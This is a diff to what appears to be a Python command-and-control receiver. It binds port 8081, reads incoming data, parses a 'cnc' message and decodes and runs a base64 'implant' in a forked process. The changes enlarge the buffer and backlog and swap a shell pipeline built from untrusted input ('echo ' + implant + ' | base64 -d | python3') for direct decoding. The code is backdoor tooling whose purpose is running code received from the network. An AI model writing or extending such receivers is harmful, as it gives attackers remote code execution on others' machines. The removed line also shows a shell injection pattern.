@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 import urllib.parse
+from base64 import b64decode
 
 HOST = ""
 PORT = 8081
@@ -10,14 +11,14 @@ PORT = 8081
 def accept_connection():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind((HOST, PORT))
-    sock.listen(1)
+    sock.listen(10)
     conn, addr = sock.accept()
 
     data = b""
     while True:
-        data_in = conn.recv(1024)
+        data_in = conn.recv(2048)
         data += data_in
-        if len(data_in) < 1024:
+        if len(data_in) == 0:
             break
     sock.close()
 
@@ -43,7 +44,7 @@ def parse_cnc(data):
 
 
 def execute_cnc(implant):
-    command = "echo " + implant + " | base64 -d | python3"
+    command = b64decode(implant).decode('utf-8')
 
     # Fork the process and execute the implant.  Allows the implant to run
     # without the reveiver also running.
